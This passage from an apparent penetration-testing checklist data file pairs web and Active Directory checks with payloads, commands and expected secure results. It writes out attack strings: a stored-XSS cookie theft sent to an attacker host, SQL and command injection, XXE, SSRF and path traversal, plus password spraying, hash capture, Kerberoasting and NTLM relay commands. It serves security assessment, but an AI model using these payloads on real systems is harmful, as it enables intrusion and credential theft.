        expectedResult: "New session token generated upon successful authentication"
      },
      {
        name: "Session Hijacking via XSS",
        description: "Test whether session cookies can be stolen through XSS due to missing HttpOnly flag.",
        tools: ["Burp Suite", "Browser DevTools"],
        payload: "document.cookie in browser console; check HttpOnly flag on session cookies",
        expectedResult: "Session cookies have HttpOnly flag set, preventing JavaScript access"
      },
      {
        name: "Concurrent Session Handling",
        description: "Test how the application handles multiple concurrent sessions for the same user account.",
        tools: ["Burp Suite", "Multiple browsers"],
        payload: "Login from two different browsers/devices simultaneously and test session interaction",
        expectedResult: "Application enforces session limits or notifies user of concurrent sessions"
      },
      {
        name: "Session Timeout",
        description: "Verify that sessions expire after an appropriate period of inactivity and absolute timeout.",
        tools: ["Burp Suite", "curl"],
        payload: "Leave session idle for configured timeout period, then attempt to use it",
        expectedResult: "Session expires after 15-30 minutes of inactivity and has absolute timeout"
      },
      {
        name: "Cookie Scope Analysis",
        description: "Verify that cookies are scoped appropriately with domain, path, and SameSite attributes.",
        tools: ["Browser DevTools", "Burp Suite"],
        payload: "Examine Set-Cookie headers for domain, path, SameSite, Secure, and HttpOnly attributes",
        expectedResult: "Cookies properly scoped with SameSite=Strict/Lax, Secure, and HttpOnly flags"
      },
      {
        name: "Session Token in URL",
        description: "Check whether session tokens are transmitted in URL parameters which could be leaked via Referer headers or logs.",
        tools: ["Burp Suite", "curl"],
        payload: "Check for session IDs in URLs: jsessionid, PHPSESSID, sid parameters",
        expectedResult: "Session tokens never appear in URLs"
      },
      {
        name: "Cross-Site Request Forgery",
        description: "Test for CSRF vulnerabilities on state-changing operations including token validation and SameSite cookie enforcement.",
        tools: ["Burp Suite", "Custom HTML"],
        payload: "<form action='https://<target>/change-email' method='POST'><input name='email' value='attacker@evil.com'><input type='submit'></form>",
        expectedResult: "CSRF tokens present and validated on all state-changing operations"
      },
      {
        name: "Session Regeneration After Privilege Change",
        description: "Verify that session tokens are regenerated after privilege level changes such as login, role change, or password change.",
        tools: ["Burp Suite"],
        payload: "Compare session token before and after: login, password change, role elevation, email change",
        expectedResult: "Session token regenerated after any privilege level change"
      },
      {
        name: "Secure Cookie Transmission",
        description: "Verify that session cookies are only transmitted over HTTPS connections using the Secure flag.",
        tools: ["curl", "Burp Suite"],
        payload: "curl -sI http://<target>/ | grep -i 'Set-Cookie'",
        expectedResult: "All sensitive cookies have the Secure flag set"
      },
      {
        name: "Session Puzzle",
        description: "Test whether partial authentication state can be manipulated to bypass multi-step authentication processes.",
        tools: ["Burp Suite"],
        payload: "After completing step 1 of auth, directly access post-auth pages or manipulate step indicators",
        expectedResult: "Multi-step authentication cannot be bypassed by skipping or reordering steps"
      },
      {
        name: "Token Binding",
        description: "Test whether session tokens are bound to specific client attributes like IP address or User-Agent.",
        tools: ["curl", "Burp Suite"],
        payload: "Replay session token from different IP or with different User-Agent",
        expectedResult: "Application detects and handles session token use from unexpected contexts"
      },
      {
        name: "Session Storage Security",
        description: "Check client-side session storage (localStorage, sessionStorage) for sensitive data exposure.",
        tools: ["Browser DevTools"],
        payload: "In browser console: Object.keys(localStorage).forEach(k => console.log(k, localStorage.getItem(k)))",
        expectedResult: "No sensitive data (tokens, PII, credentials) stored in localStorage"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Category 5: Authorization Testing
  // -------------------------------------------------------------------------
  {
    category: "Authorization",
    checks: [
      {
        name: "Horizontal Privilege Escalation",
        description: "Test whether users can access resources belonging to other users at the same privilege level.",
        tools: ["Burp Suite Autorize", "curl"],
        payload: "Access /api/users/2/profile using user 1's session token",
        expectedResult: "Users cannot access other users' resources, proper 403 response returned"
      },
      {
        name: "Vertical Privilege Escalation",
        description: "Test whether lower-privileged users can access administrative or higher-privileged functionality.",
        tools: ["Burp Suite Autorize", "curl"],
        payload: "Access /admin/dashboard using a regular user session token",
        expectedResult: "Regular users receive 403 when attempting to access admin functions"
      },
      {
        name: "Insecure Direct Object Reference",
        description: "Test for IDOR vulnerabilities by manipulating object references (IDs, filenames) in API requests.",
        tools: ["Burp Suite", "curl"],
        payload: "Change numeric IDs: /api/invoice/1001 to /api/invoice/1002; test UUID guessing and sequential patterns",
        expectedResult: "Object access controlled by authorization checks, not just knowledge of the reference"
      },
      {
        name: "Path Traversal in Authorization",
        description: "Test whether path traversal can bypass authorization checks on protected resources.",
        tools: ["Burp Suite", "curl"],
        payload: "curl -s https://<target>/admin/../admin/dashboard && curl -s https://<target>/ADMIN/dashboard && curl -s 'https://<target>/admin%2f..%2fadmin/dashboard'",
        expectedResult: "Path normalization applied before authorization checks"
      },
      {
        name: "HTTP Method Override",
        description: "Test whether HTTP method override headers can bypass method-based access controls.",
        tools: ["curl", "Burp Suite"],
        payload: "curl -s -X POST -H 'X-HTTP-Method-Override: DELETE' https://<target>/api/resource/1",
        expectedResult: "Method override headers do not bypass access controls"
      },
      {
        name: "Missing Function Level Access Control",
        description: "Test whether all server-side functions enforce proper authorization, not just the UI-level controls.",
        tools: ["Burp Suite", "curl"],
        payload: "Discover admin API endpoints from JavaScript/docs and call them with unprivileged user tokens",
        expectedResult: "All API endpoints enforce server-side authorization checks"
      },
      {
        name: "Role-Based Access Control Testing",
        description: "Test RBAC implementation by attempting operations outside the user's assigned role permissions.",
        tools: ["Burp Suite Autorize", "curl"],
        payload: "Map all role-specific endpoints and test each with tokens from different roles",
        expectedResult: "Each role restricted to its defined permissions only"
      },
      {
        name: "Multi-Tenant Isolation",
        description: "Test whether tenants can access data or functionality belonging to other tenants in multi-tenant applications.",
        tools: ["Burp Suite", "curl"],
        payload: "Access tenant B resources using tenant A credentials; test tenant header/parameter manipulation",
        expectedResult: "Complete data isolation between tenants"
      },
      {
        name: "API Endpoint Authorization",
        description: "Test authorization on all API endpoints including undocumented and deprecated endpoints.",
        tools: ["Burp Suite", "ffuf"],
        payload: "ffuf -u https://<target>/api/v1/FUZZ -w api-wordlist.txt -H 'Authorization: Bearer <user-token>' -mc 200",
        expectedResult: "All API endpoints enforce proper authorization"
      },
      {
        name: "GraphQL Authorization",
        description: "Test GraphQL endpoints for authorization bypass through query manipulation, introspection, and batched queries.",
        tools: ["GraphQL Voyager", "Burp Suite", "InQL"],
        payload: "Query: { __schema { types { name fields { name } } } } and mutation with unauthorized fields",
        expectedResult: "GraphQL enforces field-level authorization and limits introspection in production"
      },
      {
        name: "File Access Control",
        description: "Test whether uploaded or generated files are properly access-controlled and not publicly accessible.",
        tools: ["curl", "Burp Suite"],
        payload: "Access uploaded file URLs without authentication; test direct access to /uploads/ directory",
        expectedResult: "File access requires authentication and authorization checks"
      },
      {
        name: "Mass Assignment / Parameter Pollution",
        description: "Test whether additional parameters can be injected to modify protected fields like role, isAdmin, or balance.",
        tools: ["Burp Suite", "curl"],
        payload: "curl -s -X PUT https://<target>/api/profile -H 'Content-Type: application/json' -d '{\"name\":\"test\",\"role\":\"admin\",\"isAdmin\":true}'",
        expectedResult: "Server ignores mass assignment of protected fields"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Category 6: Input Validation
  // -------------------------------------------------------------------------
  {
    category: "Input Validation",
    checks: [
      {
        name: "Reflected Cross-Site Scripting",
        description: "Test for reflected XSS by injecting JavaScript payloads into parameters that are reflected in the response.",
        tools: ["Dalfox", "XSSStrike", "Burp Suite"],
        payload: "<script>alert(document.domain)</script> and variations: <img src=x onerror=alert(1)> , <svg onload=alert(1)>",
        expectedResult: "All user input properly encoded in output context, no script execution"
      },
      {
        name: "Stored Cross-Site Scripting",
        description: "Test for stored XSS by injecting payloads into fields that are stored and displayed to other users.",
        tools: ["Burp Suite", "Browser"],
        payload: "Store payload in profile fields, comments, messages: <img src=x onerror=fetch('https://attacker/'+document.cookie)>",
        expectedResult: "Stored input properly sanitized and encoded when displayed"
      },
      {
        name: "DOM-Based Cross-Site Scripting",
        description: "Test for DOM-based XSS vulnerabilities in client-side JavaScript that processes user-controllable sources.",
        tools: ["Burp Suite DOM Invader", "Browser DevTools"],
        payload: "https://<target>/page#<img src=x onerror=alert(1)> -- test URL fragments, postMessage, document.referrer",
        expectedResult: "Client-side JavaScript properly sanitizes DOM sources before using in sinks"
      },
      {
        name: "SQL Injection (Error-Based)",
        description: "Test for error-based SQL injection by injecting SQL syntax that produces database error messages.",
        tools: ["SQLMap", "Burp Suite"],
        payload: "' OR 1=1-- , ' UNION SELECT NULL-- , 1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        expectedResult: "No SQL errors returned, parameterized queries used throughout"
      },
      {
        name: "SQL Injection (Blind)",
        description: "Test for blind SQL injection using boolean-based and time-based techniques.",
        tools: ["SQLMap", "Burp Suite"],
        payload: "1' AND 1=1-- (true) vs 1' AND 1=2-- (false); 1' AND SLEEP(5)-- (time-based)",
        expectedResult: "No observable differences in response indicating SQL injection"
      },
      {
        name: "NoSQL Injection",
        description: "Test for NoSQL injection in MongoDB, CouchDB, and other NoSQL databases.",
        tools: ["NoSQLMap", "Burp Suite"],
        payload: "{\"username\":{\"$ne\":\"\"}, \"password\":{\"$ne\":\"\"}} and {\"username\":{\"$gt\":\"\"}, \"password\":{\"$regex\":\".*\"}}",
        expectedResult: "NoSQL queries properly parameterized, operator injection prevented"
      },
      {
        name: "Command Injection",
        description: "Test for OS command injection in parameters processed by server-side system commands.",
        tools: ["Commix", "Burp Suite"],
        payload: "; whoami, | whoami, $(whoami), `whoami`, & whoami, || whoami, && whoami, %0awhoami",
        expectedResult: "No command execution, input validated and parameterized system calls used"
      },
      {
        name: "LDAP Injection",
        description: "Test for LDAP injection in authentication and search functionality that queries LDAP directories.",
        tools: ["Burp Suite", "curl"],
        payload: "*)(&, *)(|(&, admin)(&), )(cn=*))(|(cn=*",
        expectedResult: "LDAP queries properly escaped and parameterized"
      },
      {
        name: "XML Injection / XXE",
        description: "Test for XML External Entity injection in XML-processing endpoints.",
        tools: ["Burp Suite", "XXEinjector"],
        payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        expectedResult: "External entity processing disabled, XML parser securely configured"
      },
      {
        name: "Server-Side Template Injection",
        description: "Test for SSTI in template engines by injecting template syntax into user-controllable inputs.",
        tools: ["tplmap", "Burp Suite"],
        payload: "{{7*7}}, ${7*7}, #{7*7}, {{config}}, {{self.__class__.__mro__[2].__subclasses__()}}",
        expectedResult: "Template expressions not evaluated in user input, output shows literal text"
      },
      {
        name: "File Upload Validation",
        description: "Test file upload functionality for unrestricted file type upload, content-type bypass, and path traversal.",
        tools: ["Burp Suite", "curl"],
        payload: "Upload: shell.php, shell.php.jpg, shell.pHp, shell.php%00.jpg, shell.php;.jpg with Content-Type manipulation",
        expectedResult: "Server validates file content (magic bytes), enforces allowlist, renames uploaded files"
      },
      {
        name: "HTTP Parameter Pollution",
        description: "Test for HTTP parameter pollution by sending duplicate parameters to exploit parsing differences.",
        tools: ["Burp Suite", "curl"],
        payload: "?user=admin&user=attacker -- test which value the server uses; test array parameter injection",
        expectedResult: "Application handles duplicate parameters consistently and safely"
      },
      {
        name: "Path Traversal",
        description: "Test for path traversal vulnerabilities that allow reading files outside the intended directory.",
        tools: ["dotdotpwn", "Burp Suite"],
        payload: "../../etc/passwd, ..\\..\\windows\\system32\\drivers\\etc\\hosts, ....//....//etc/passwd, %2e%2e%2f%2e%2e%2fetc%2fpasswd",
        expectedResult: "Path traversal sequences stripped or blocked, file access restricted to intended directory"
      },
      {
        name: "SSRF Testing",
        description: "Test for Server-Side Request Forgery in parameters that accept URLs or network addresses.",
        tools: ["Burp Suite Collaborator", "ffuf"],
        payload: "http://169.254.169.254/latest/meta-data/, http://127.0.0.1:8080/admin, http://[::1]/, http://0x7f000001/",
        expectedResult: "Server validates and restricts outbound requests, blocks internal/metadata addresses"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Category 7: Error Handling
  // -------------------------------------------------------------------------
  {
    category: "Error Handling",
    checks: [
      {
        name: "Stack Trace Exposure",
        description: "Test whether application errors expose stack traces, source code paths, or framework internals to users.",
        tools: ["curl", "Burp Suite"],
        payload: "Trigger errors: invalid parameters, wrong content types, malformed input, division by zero",
        expectedResult: "Generic error messages returned, no stack traces or internal paths exposed"
      },
      {
        name: "Database Error Messages",
        description: "Test whether database errors reveal schema information, query structure, or database version details.",
        tools: ["SQLMap", "curl"],
        payload: "Inject SQL syntax characters: ' \" ; -- to trigger database errors",
        expectedResult: "Database errors caught and replaced with generic messages"
      },
      {
        name: "Custom Error Pages",
        description: "Verify that custom error pages are configured for all HTTP error codes and do not leak information.",
        tools: ["curl"],
        payload: "curl -s -o /dev/null -w '%{http_code}' https://<target>/nonexistent && curl -s https://<target>/nonexistent",
        expectedResult: "Custom error pages for 400, 401, 403, 404, 405, 500 that do not reveal server details"
      },
      {
        name: "Verbose Error in APIs",
        description: "Test API endpoints for overly verbose error messages that reveal internal implementation details.",
        tools: ["curl", "Burp Suite"],
        payload: "Send malformed JSON, wrong data types, missing required fields, oversized payloads",
        expectedResult: "API returns structured error responses without internal details"
      },
      {
        name: "Debug Mode Detection",
        description: "Check whether debug mode is enabled in production, exposing detailed error information and debug endpoints.",
        tools: ["curl", "Nuclei"],
        payload: "curl -s https://<target>/__debug__/ && curl -s https://<target>/debug/pprof/ && curl -s https://<target>/actuator",
        expectedResult: "Debug mode disabled in production, no debug endpoints accessible"
      },
      {
        name: "Error Code Consistency",
        description: "Verify that error responses use consistent HTTP status codes and do not leak information through status code variations.",
        tools: ["Burp Suite", "curl"],
        payload: "Compare error codes for existing vs non-existing resources, valid vs invalid auth",
        expectedResult: "Consistent error codes that do not reveal resource existence or auth state"
      },
      {
        name: "Exception Handling Completeness",
        description: "Test edge cases and boundary conditions to verify all exceptions are properly handled.",
        tools: ["Burp Suite", "curl"],
        payload: "Null bytes, extremely long input, negative numbers, special characters, empty requests, concurrent requests",
        expectedResult: "All edge cases handled gracefully without unhandled exceptions"
      },
      {
        name: "Information Leakage via Timing",
        description: "Test for timing-based information leakage in authentication and authorization decisions.",
        tools: ["curl", "Custom timing scripts"],
        payload: "Measure response times for valid vs invalid usernames, correct vs incorrect passwords",
        expectedResult: "Consistent response times regardless of validation outcome"
      },
      {
        name: "Error Rate Limiting",
        description: "Test whether error responses are rate-limited to prevent abuse and information gathering.",
        tools: ["curl", "Burp Suite"],
        payload: "Send rapid error-triggering requests and observe rate limiting behavior",
        expectedResult: "Error responses rate-limited to prevent enumeration and abuse"
      },
      {
        name: "Sensitive Data in Error Responses",
        description: "Check that error responses do not include sensitive data such as PII, credentials, or internal IP addresses.",
        tools: ["Burp Suite", "grep"],
        payload: "Trigger various errors and search responses for IP addresses, email addresses, credentials, file paths",
        expectedResult: "Error responses contain no sensitive data, internal IPs, or credentials"
      },
      {
        name: "Unhandled Content Types",
        description: "Test application behavior when receiving unexpected content types to find parsing errors.",
        tools: ["curl", "Burp Suite"],
        payload: "Send requests with Content-Type: application/xml, text/csv, multipart/mixed to JSON endpoints",
        expectedResult: "Application rejects unexpected content types with appropriate 415 response"
      },
      {
        name: "Denial of Service via Error Handling",
        description: "Test whether error handling paths can be exploited to cause resource exhaustion or denial of service.",
        tools: ["curl", "Custom scripts"],
        payload: "Send requests designed to trigger expensive error processing: regex DoS, large XML, recursive JSON",
        expectedResult: "Error handling does not consume excessive resources"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Category 8: Cryptography
  // -------------------------------------------------------------------------
  {
    category: "Crypto",
    checks: [
      {
        name: "Data at Rest Encryption",
        description: "Verify that sensitive data is encrypted at rest using strong encryption algorithms and proper key management.",
        tools: ["Database analysis", "Configuration review"],
        payload: "Examine database storage for sensitive fields: passwords (hashed?), PII (encrypted?), financial data",
        expectedResult: "Sensitive data encrypted with AES-256 or equivalent, passwords hashed with bcrypt/Argon2"
      },
      {
        name: "Data in Transit Encryption",
        description: "Verify that all data transmission uses TLS 1.2 or higher with strong cipher suites.",
        tools: ["testssl.sh", "sslscan", "Wireshark"],
        payload: "testssl.sh --protocols --ciphers https://<target>/",
        expectedResult: "TLS 1.2+ enforced, no SSLv3/TLS1.0/TLS1.1, strong cipher suites only"
      },
      {
        name: "Password Storage Mechanism",
        description: "Verify that passwords are stored using appropriate one-way hashing algorithms with proper salting.",
        tools: ["Code review", "Database analysis"],
        payload: "If database access obtained, analyze password field format and length",
        expectedResult: "Passwords stored using bcrypt, scrypt, or Argon2id with unique per-user salt"
      },
      {
        name: "Random Number Generation",
        description: "Verify that cryptographically secure random number generators are used for security-sensitive operations.",
        tools: ["Code review", "Burp Suite Sequencer"],
        payload: "Collect tokens/session IDs and analyze randomness using statistical tests",
        expectedResult: "CSPRNG used for all security tokens, passing NIST statistical tests"
      },
      {
        name: "Key Management Practices",
        description: "Review how cryptographic keys are generated, stored, rotated, and destroyed.",
        tools: ["Configuration review", "Code review"],
        payload: "Check for hardcoded keys in source code, environment variables, and configuration files",
        expectedResult: "Keys stored in HSM or secure vault, regular rotation, no hardcoded keys"
      },
      {
        name: "Certificate Validation",
        description: "Verify that the application properly validates TLS certificates including chain, expiration, and hostname.",
        tools: ["testssl.sh", "openssl"],
        payload: "openssl s_client -connect <target>:443 -servername <target> < /dev/null 2>/dev/null | openssl x509 -noout -dates -subject -issuer",
        expectedResult: "Valid certificate chain, not expired, correct hostname, not self-signed"
      },
      {
        name: "Deprecated Algorithm Detection",
        description: "Identify use of deprecated or weak cryptographic algorithms such as MD5, SHA1, DES, RC4, or RSA-1024.",
        tools: ["testssl.sh", "sslscan", "Code review"],
        payload: "testssl.sh --vulnerable https://<target>/ && sslscan <target>",
        expectedResult: "No deprecated algorithms in use (MD5, SHA1 for signatures, DES, 3DES, RC4)"
      },
      {
        name: "Initialization Vector Usage",
        description: "Verify that encryption implementations use unique, random initialization vectors for each operation.",
        tools: ["Code review", "Traffic analysis"],
        payload: "Compare encrypted outputs for identical inputs to detect IV reuse",
        expectedResult: "Unique random IV for each encryption operation"
      },
      {
        name: "Sensitive Data Exposure in URLs",
        description: "Check that sensitive data such as tokens, keys, and PII are not transmitted in URL parameters.",
        tools: ["Burp Suite", "Access log review"],
        payload: "Review all URLs for tokens, session IDs, passwords, or PII in query parameters",
        expectedResult: "No sensitive data in URL parameters"
      },
      {
        name: "Padding Oracle Attack",
        description: "Test CBC mode implementations for padding oracle vulnerabilities that could allow decryption of ciphertexts.",
        tools: ["PadBuster", "Burp Suite"],
        payload: "padbuster https://<target>/decrypt?data=<ciphertext> <ciphertext> 16 -encoding 0",
        expectedResult: "No padding oracle: consistent error responses regardless of padding validity"
      },
      {
        name: "Token Entropy Analysis",
        description: "Analyze the entropy of security tokens to ensure they cannot be predicted or brute-forced.",
        tools: ["Burp Suite Sequencer", "ent"],
        payload: "Collect 10000+ tokens and run through Burp Sequencer or entropy analysis tools",
        expectedResult: "Tokens have minimum 128 bits of entropy with no discernible patterns"
      },
      {
        name: "Insecure Cryptographic Storage",
        description: "Check for sensitive data stored in plaintext or with reversible encryption where hashing should be used.",
        tools: ["Database review", "Code review"],
        payload: "Review database schemas for sensitive fields; check encryption methods used",
        expectedResult: "All sensitive data appropriately encrypted or hashed based on use case"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Category 9: Business Logic
  // -------------------------------------------------------------------------
  {
    category: "Business Logic",
    checks: [
      {
        name: "Price Manipulation",
        description: "Test whether prices, discounts, or financial values can be manipulated through client-side or API modifications.",
        tools: ["Burp Suite", "curl"],
        payload: "Modify price parameter in request: price=0.01, price=-100, quantity=-1, discount=100",
        expectedResult: "Server-side price validation, client values not trusted for financial calculations"
      },
      {
        name: "Workflow Bypass",
        description: "Test whether multi-step workflows can be bypassed by skipping steps, reordering, or replaying requests.",
        tools: ["Burp Suite", "curl"],
        payload: "Skip payment step in checkout flow; directly submit final step request",
        expectedResult: "Server enforces workflow state machine, steps cannot be skipped or reordered"
      },
      {
        name: "Rate Limit Testing",
        description: "Test rate limiting on sensitive operations including login, registration, password reset, and API calls.",
        tools: ["Burp Suite Intruder", "ffuf", "curl"],
        payload: "Send 100+ rapid requests to login endpoint, password reset, SMS/email verification",
        expectedResult: "Rate limits enforced on all sensitive operations with appropriate lockout"
      },
      {
        name: "Race Condition Exploitation",
        description: "Test for race conditions in operations that should be atomic such as balance transfers, coupon redemption, and voting.",
        tools: ["Burp Suite Turbo Intruder", "curl"],
        payload: "Send simultaneous requests to redeem same coupon, transfer same funds, vote multiple times",
        expectedResult: "Operations are atomic, no double-spending or duplicate redemption possible"
      },
      {
        name: "Quantity Manipulation",
        description: "Test whether item quantities, limits, or quotas can be manipulated beyond business rules.",
        tools: ["Burp Suite", "curl"],
        payload: "Set quantity to: 0, -1, 999999, 0.5, MAX_INT; test cart/order quantity limits",
        expectedResult: "Server validates quantities against business rules with proper bounds checking"
      },
      {
        name: "Feature Access Control",
        description: "Test whether premium or paid features can be accessed without proper subscription or payment.",
        tools: ["Burp Suite", "curl"],
        payload: "Access premium API endpoints with free-tier account; modify subscription level in requests",
        expectedResult: "Feature access tied to server-side subscription/entitlement checks"
      },
      {
        name: "Referral and Reward Abuse",
        description: "Test referral programs, reward systems, and promotional offers for abuse through self-referral or manipulation.",
        tools: ["Burp Suite", "curl"],
        payload: "Self-refer using different emails; manipulate referral codes; replay reward claims",
        expectedResult: "Referral and reward systems validated against abuse patterns"
      },
      {
        name: "Data Validation Boundaries",
        description: "Test input validation boundaries for all business data fields including maximum lengths, special characters, and data types.",
        tools: ["Burp Suite", "curl"],
        payload: "Submit: empty fields, max-length+1, negative numbers, special characters, Unicode, null bytes",
        expectedResult: "All input validated against defined business rules on the server side"
      },
      {
        name: "Transaction Logic",
        description: "Test financial transaction logic for double-charging, balance manipulation, and currency conversion issues.",
        tools: ["Burp Suite", "curl"],
        payload: "Replay payment confirmation; modify currency; test insufficient funds edge cases",
        expectedResult: "Transaction integrity maintained with proper idempotency and validation"
      },
      {
        name: "Privilege Escalation via Business Logic",
        description: "Test whether business logic flaws allow privilege escalation such as changing account type or accessing admin functions.",
        tools: ["Burp Suite", "curl"],
        payload: "Modify account type parameter, access admin functions through API, escalate via invitation flows",
        expectedResult: "Account types and privileges managed server-side, not modifiable by users"
      },
      {
        name: "File Upload Business Logic",
        description: "Test business logic around file uploads including size limits, rate limits, and storage quota enforcement.",
        tools: ["Burp Suite", "curl"],
        payload: "Upload files exceeding size limit; upload beyond quota; upload rapid succession",
        expectedResult: "File upload limits enforced server-side with proper quota management"
      },
      {
        name: "Email/Notification Abuse",
        description: "Test whether email, SMS, or push notification features can be abused for spam or social engineering.",
        tools: ["Burp Suite", "curl"],
        payload: "Trigger password reset for arbitrary emails; manipulate notification content; test rate limits",
        expectedResult: "Notification features rate-limited with content sanitization"
      }
    ]
  },

  // -------------------------------------------------------------------------
  // Category 10: Client-Side Testing
  // -------------------------------------------------------------------------
  {
    category: "Client-Side",
    checks: [
      {
        name: "DOM-Based Vulnerabilities",
        description: "Analyze client-side JavaScript for DOM-based vulnerabilities including XSS, open redirects, and cookie manipulation.",
        tools: ["Burp Suite DOM Invader", "Browser DevTools", "Retire.js"],
        payload: "Trace user-controllable sources (location.hash, document.referrer, postMessage) to dangerous sinks (innerHTML, eval, document.write)",
        expectedResult: "No DOM-based vulnerabilities, safe DOM manipulation practices used"
      },
      {
        name: "JavaScript Library Vulnerabilities",
        description: "Identify outdated JavaScript libraries with known vulnerabilities.",
        tools: ["Retire.js", "Snyk", "npm audit"],
        payload: "retire --js --outputformat json --outputpath retire-results.json",
        expectedResult: "All JavaScript libraries up to date with no known vulnerabilities"
      },
      {
        name: "Clickjacking",
        description: "Test whether the application can be framed by malicious sites to trick users into performing actions.",
        tools: ["curl", "Browser"],
        payload: "<iframe src='https://<target>/sensitive-action' style='opacity:0;position:absolute;'></iframe>",
        expectedResult: "X-Frame-Options or CSP frame-ancestors prevents framing"
      },
      {
        name: "Open Redirect",
        description: "Test for open redirect vulnerabilities that could be used in phishing attacks.",
        tools: ["Burp Suite", "curl"],
        payload: "https://<target>/redirect?url=https://evil.com , //evil.com, \\\\evil.com, https://<target>@evil.com",
        expectedResult: "Redirect URLs validated against allowlist, no open redirects"
      },
      {
        name: "Client-Side Data Storage",
        description: "Review data stored in localStorage, sessionStorage, IndexedDB, and cookies for sensitive information.",
        tools: ["Browser DevTools"],
        payload: "Enumerate localStorage, sessionStorage, IndexedDB, WebSQL, cookies for sensitive data",
        expectedResult: "No PII, tokens, or sensitive data in client-side storage"
      },
      {
        name: "Postmessage Security",
        description: "Test window.postMessage implementations for origin validation and message handling vulnerabilities.",
        tools: ["Browser DevTools", "Burp Suite"],
        payload: "window.postMessage('malicious','*') from attacker-controlled iframe; check origin validation in message handlers",
        expectedResult: "Message handlers validate origin before processing messages"
      },
      {
        name: "WebSocket Security",
        description: "Test WebSocket connections for authentication, authorization, and input validation.",
        tools: ["Burp Suite", "wscat"],
        payload: "wscat -c wss://<target>/ws -- test auth bypass, inject payloads, test cross-origin",
        expectedResult: "WebSockets authenticated, authorized, and input-validated like HTTP endpoints"
      },
      {
        name: "Browser Cache Analysis",
        description: "Test whether sensitive pages and data are cacheable by the browser or intermediate proxies.",
        tools: ["curl", "Browser DevTools"],
        payload: "curl -sI https://<target>/account | grep -iE '(Cache-Control|Pragma|Expires)'",
        expectedResult: "Sensitive pages include Cache-Control: no-store, no-cache headers"
      },
      {
        name: "Content Injection",
        description: "Test for content injection through HTML injection, CSS injection, and MIME type confusion.",
        tools: ["Burp Suite", "curl"],
        payload: "<h1>Injected Content</h1><p>Please login at http://evil.com</p>",
        expectedResult: "All user input HTML-encoded in output context, preventing content injection"
      },
      {
        name: "Cross-Origin Resource Loading",
        description: "Test for insecure cross-origin resource loading including scripts, stylesheets, and images from untrusted origins.",
        tools: ["Browser DevTools", "CSP Evaluator"],
        payload: "Review page source for resources loaded from third-party domains without SRI",
        expectedResult: "External resources loaded with Subresource Integrity (SRI) hashes"
      },
      {
        name: "Client-Side Prototype Pollution",
        description: "Test for prototype pollution vulnerabilities in JavaScript that could lead to XSS or logic bypass.",
        tools: ["Browser DevTools", "Burp Suite"],
        payload: "https://<target>/?__proto__[test]=polluted -- check if Object.prototype.test === 'polluted'",
        expectedResult: "No prototype pollution vectors, Object.freeze or validation on user input objects"
      },
      {
        name: "Service Worker Analysis",
        description: "Analyze registered service workers for scope issues, cache poisoning, and persistent XSS vectors.",
        tools: ["Browser DevTools"],
        payload: "Check navigator.serviceWorker.controller; review sw.js scope and cache strategy",
        expectedResult: "Service workers properly scoped with secure cache strategies"
      }
    ]
  }
];

// -----------------------------------------------------------------------------
// 3. AD_METHODOLOGY -- Active Directory Penetration Testing (6 phases)
// -----------------------------------------------------------------------------

const AD_METHODOLOGY = [
  // -------------------------------------------------------------------------
  // Phase 1: Initial Access
  // -------------------------------------------------------------------------
  {
    phase: "Initial Access",
    techniques: [
      {
        name: "Password Spraying",
        description: "Attempt common passwords against many accounts to find valid credentials while avoiding account lockout.",
        command: "crackmapexec smb <dc-ip> -u users.txt -p 'Spring2024!' --no-bruteforce --continue-on-success",
        tool: "CrackMapExec",
        indicators: "Successful authentication events (Event ID 4624) across multiple accounts"
      },
      {
        name: "LLMNR/NBT-NS Poisoning",
        description: "Capture NTLMv2 hashes by poisoning LLMNR and NBT-NS name resolution requests on the local network.",
        command: "responder -I eth0 -dwPv",
        tool: "Responder",
        indicators: "Captured NTLMv2 hashes in Responder logs, Event ID 4624 type 3 logons"
      },
      {
        name: "AS-REP Roasting",
        description: "Request TGTs for accounts that do not require pre-authentication and crack them offline.",
        command: "GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip> -format hashcat -outputfile asrep.txt",
        tool: "Impacket (GetNPUsers.py)",
        indicators: "Event ID 4768 with pre-auth type 0 for targeted accounts"
      },
      {
        name: "Kerberoasting",
        description: "Request service tickets for service accounts and crack them offline to obtain plaintext passwords.",
        command: "GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc-ip> -outputfile kerberoast.txt",
        tool: "Impacket (GetUserSPNs.py)",
        indicators: "Event ID 4769 with encryption type 0x17 (RC4) for multiple SPNs"
      },
      {
        name: "SMB Relay Attack",
        description: "Relay captured NTLM authentication to other systems where SMB signing is not enforced.",
        command: "ntlmrelayx.py -tf targets.txt -smb2support -i",
        tool: "Impacket (ntlmrelayx.py)",
        indicators: "Event ID 4624 type 3 from unexpected source, SMB signing not required"
      },
      {
        name: "IPv6 DNS Takeover",
        description: "Exploit IPv6 configuration to become the DNS server and intercept authentication requests.",
        command: "mitm6 -d <domain> && ntlmrelayx.py -6 -t ldaps://<dc-ip> -wh fake-wpad.<domain> -l lootdir",
        tool: "mitm6 + ntlmrelayx.py",
        indicators: "DHCPv6 responses from non-infrastructure host, unexpected DNS server"
      },
      {
        name: "NTLM Downgrade Attack",
        description: "Force NTLM authentication downgrades to capture and relay weaker authentication hashes.",
        command: "responder -I eth0 -dwPv --disable-ess",
        tool: "Responder",
        indicators: "NTLMv1 authentication events, unexpected NTLM authentication attempts"
      },
      {
        name: "Credential Phishing",
        description: "Conduct targeted phishing to capture domain credentials through fake login portals or document macros.",
        command: "evilginx2 -p phishlets/ && gophish",
        tool: "Evilginx2, GoPhish",
        indicators: "Unusual email patterns, reports of suspicious login pages"
      },
      {
        name: "ADCS ESC1 - Template Misconfiguration",
        description: "Exploit misconfigured AD Certificate Services templates that allow requesting certificates for other users.",
        command: "certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc-ip> -vulnerable -stdout",
        tool: "Certipy",
        indicators: "Certificate enrollment for unexpected users, Event ID 4886/4887"
      },
      {
        name: "Default Credential Exploitation",
